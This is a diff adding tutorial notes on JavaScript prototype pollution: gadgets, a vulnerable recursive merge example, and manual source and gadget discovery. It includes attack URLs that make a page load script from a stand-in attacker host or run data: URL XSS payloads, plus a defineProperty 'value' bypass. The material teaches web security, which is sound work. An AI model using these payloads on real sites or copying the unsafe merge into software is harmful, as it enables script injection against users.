@@ -139,4 +139,175 @@ objectFromJson.hasOwnProperty('__proto__');    // true
 ### Prototype pollution sink
 A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands.
 
+### Prototype pollution gadget
+An exploitable gadget is any property that is passed into a sink without proper filtering or sanitization. Means that turning the prototype pollution vulnerability into an actual exploit.
+
+#### Example:
+
+```js
+let transport_url = config.transport_url || defaults.transport_url;
+```
+Now imagine the library code uses this transport_url to add a script reference to the page:
+
+```js
+let script = document.createElement('script');
+script.src = `${transport_url}/example.js`;
+document.body.appendChild(script);
+```
+
+Attacker can pollute the global `Object.prototype` with their own `transport_url` property, this will be inherited by `config` object. If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:
+
+```
+https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
+```
+By providing a data: URL, an attacker could also directly embed an XSS payload within the query string as follows:
+
+```
+https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
+```
+Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix
+
+#### Real-case example:
+
+```js
+// Example of vulnerable code that processes URL parameters
+function processQueryParams(url) {
+    let params = {};
+    // Parse URL query parameters
+    const queryString = new URLSearchParams(url.split('?')[1]);
+    
+    for (const [key, value] of queryString.entries()) {
+        // Vulnerable recursive merge function
+        merge(params, parseKey(key, value));
+    }
+    return params;
+}
+
+// Vulnerable merge function that recursively assigns properties
+function merge(target, source) {
+    for (let key in source) {
+        if (typeof source[key] === 'object') {
+            if (!target[key]) target[key] = {};
+            merge(target[key], source[key]);
+        } else {
+            target[key] = source[key];
+        }
+    }
+    return target;
+}
+
+// Parse nested keys like "a[b][c]" into object structure
+function parseKey(key, value) {
+    let result = {};
+    let current = result;
+    let parts = key.match(/[^\[\]]+/g) || [];
+    
+    for (let i = 0; i < parts.length - 1; i++) {
+        current[parts[i]] = {};
+        current = current[parts[i]];
+    }
+    current[parts[parts.length - 1]] = value;
+    return result;
+}
+
+// Example usage:
+let url = "https://example.com/?__proto__[evilProperty]=malicious";
+let params = processQueryParams(url);
+```
+
+
+1. When the URL `https://example.com/?__proto__[evilProperty]=malicious` is processed:
+- The query parameter `__proto__[evilProperty]=malicious` is parsed
+- The `parseKey` function converts it into: `{"__proto__": {"evilProperty": "malicious"}}`
+- The `merge` function then recursively assigns these properties to the target object, resulting in:
+
+2. During the merge operation:
+```js
+merge(params, {"__proto__": {"evilProperty": "malicious"}})
+```
+**VULNERABLE**: When it tries to set `target["__proto__"]["evilProperty"]` (`target` object is the `params` object)
+- JavaScript interprets `__proto__` as a special property that references the object's prototype
+- Instead of creating a new property named `__proto__`, it modifies the actual prototype
+
+3. Resulting in:
+```js
+console.log({}.__proto__.evilProperty); // "malicious"
+// Now ALL objects inherit this property
+let newObj = {};
+console.log(newObj.evilProperty); // "malicious"
+```
+
+### Client-side exploitation
+
+#### Finding source manually
+
+1. Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. For example:
+
+  `vulnerable-website.com/?__proto__[foo]=bar`
+
+If success => in console:
+
+  `Object.prototype.foo`
+
+  - "bar" indicates that you have successfully polluted the prototype
+  - undefined indicates that the attack was not successful
+
+2. Different payloads:
+  `vulnerable-website.com/?__proto__.foo=bar`
+
+3. Repeat this process for each potential source.
+
+#### Finding source using DOM Invader
+
+#### Finding gadgets manually
+
+Example sink: 
+
+```js
+async function logQuery(url, params) {
+    try {
+        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
+    } catch(e) {
+        console.error("Failed storing query");
+    }
+}
+
+async function searchLogger() {
+    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
+    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
+    if(config.transport_url) {
+        let script = document.createElement('script');
+        script.src = config.transport_url;
+        document.body.appendChild(script);
+    }
+    if(config.params && config.params.search) {
+        await logQuery('/logger', config.params);
+    }
+}
+
+window.addEventListener("load", searchLogger);
+
+```
+
+Although the searchLogger prevent prototype pollution by using `Object.defineProperty`, it still vulnerable that the `Object.defineProperty` is missing property `value`, it called only:
+
+```
+{
+  configurable: false,
+  writable: false
+}
+```
+BUT MISSING `value` property: 
+```
+{
+  value: false  // This is not specified!
+}
+```
+
+Then the Object.defineProperty will be lookup the prototype chain for the `value` property, and found it in `Object.prototype`.
+
+So the value of `transport_url` will be overridden by `data:,alert(1);`
+
+> Payload: `/?__proto__[value]=data:,alert(1);`
+
 
